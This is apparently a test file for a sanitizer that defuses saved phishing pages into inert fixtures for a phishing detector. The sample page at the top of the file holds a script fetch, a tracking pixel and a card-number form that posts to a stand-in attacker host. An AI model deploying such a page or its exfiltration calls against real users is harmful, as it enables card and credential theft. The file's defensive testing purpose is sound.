import { describe, expect, test } from 'bun:test';
import { defuse, isInert, residualRisks } from './sanitize-fixture.ts';

const DANGEROUS = `<!doctype html><html><body>
  <script>fetch('https://collector.attacker-example.net/collect')</script>
  <img src="https://collector.attacker-example.net/pixel.gif">
  <a href="https://collector.attacker-example.net/next">Continue</a>
  <form action="https://collector.attacker-example.net/steal" method="post" onsubmit="send()">
    <label for="cc">Card number</label>
    <input id="cc" name="cardnum" autocomplete="cc-number" value="4111111111111111">
    <input type="submit" value="Pay now">
  </form>
</body></html>`;

describe('defuse', () => {
  const { html, report } = defuse(DANGEROUS, { host: 'login.example.top' });

  test('removes scripts and inline handlers', () => {
    expect(html).not.toContain('<script');
    expect(html).not.toContain('onsubmit');
    expect(report.scriptsRemoved).toBe(1);
    expect(report.handlersRemoved).toBe(1);
  });

  test('cuts every remote reference so opening the file phones nobody', () => {
    // The original host survives inside the sink path as a record of where the
    // page used to post; what must not survive is anything that would resolve.
    expect(html).not.toContain('//collector.attacker-example.net');
    expect(report.externalRefsNeutralised).toBeGreaterThanOrEqual(2);
  });

  test('strips values the person who saved the page had filled in', () => {
    expect(html).not.toContain('4111111111111111');
    expect(report.valuesStripped).toBe(1);
  });

  test('keeps a submit button caption, which is page content not user data', () => {
    expect(html).toContain('Pay now');
  });

  test('keeps everything the rule engine actually reads', () => {
    // Defusing must not change what the fixture measures.
    expect(html).toContain('name="cardnum"');
    expect(html).toContain('autocomplete="cc-number"');
    expect(html).toContain('Card number');
  });

  test('keeps a cross-origin action cross-origin, pointed at a host that cannot resolve', () => {
    // Rewriting this to "#" would delete the cross_origin_action signal from
    // every collected phishing fixture and bias the evaluation against the
    // detector. .invalid is reserved, so a submission still goes nowhere.
    expect(html).toContain('action="https://sink.invalid/collector.attacker-example.net"');
    expect(html).not.toContain('/steal');
  });

  test('turns a same-origin absolute action into a relative path', () => {
    const sameOrigin = defuse(
      '<form action="https://login.example.top/next"><input name="u"></form>',
      { host: 'login.example.top' },
    );
    expect(sameOrigin.html).toContain('action="/next"');
  });

  test('leaves a relative action alone', () => {
    const relative = defuse('<form action="/collect"><input name="u"></form>', { host: 'a.test' });
    expect(relative.html).toContain('action="/collect"');
  });

  test('produces a file that passes its own check', () => {
    expect(residualRisks(html)).toEqual([]);
  });
});

describe('residualRisks', () => {
  test('names what is still live', () => {
    expect(residualRisks(DANGEROUS)).toEqual([
      'contains a <script> element',
      'contains an inline event handler',
      'a form still posts to a resolvable remote origin',
      'loads a resolvable remote resource',
    ]);
  });

  test('accepts references to reserved, non-resolving hosts', () => {
    expect(
      residualRisks('<form action="https://collect.attacker.invalid/x"><input name="u"></form>'),
    ).toEqual([]);
  });
});

describe('isInert', () => {
  test('recognises the reserved suffixes', () => {
    for (const url of [
      'https://sink.invalid/x',
      'https://mock-llm.test/v1',
      'https://collect.attacker.invalid/',
      'https://shop.example/',
    ]) {
      expect(isInert(url)).toBe(true);
    }
  });

  test('does not accept a real host', () => {
    for (const url of ['https://evil.example.com/x', 'https://paypal.com/']) {
      expect(isInert(url)).toBe(false);
    }
  });
});
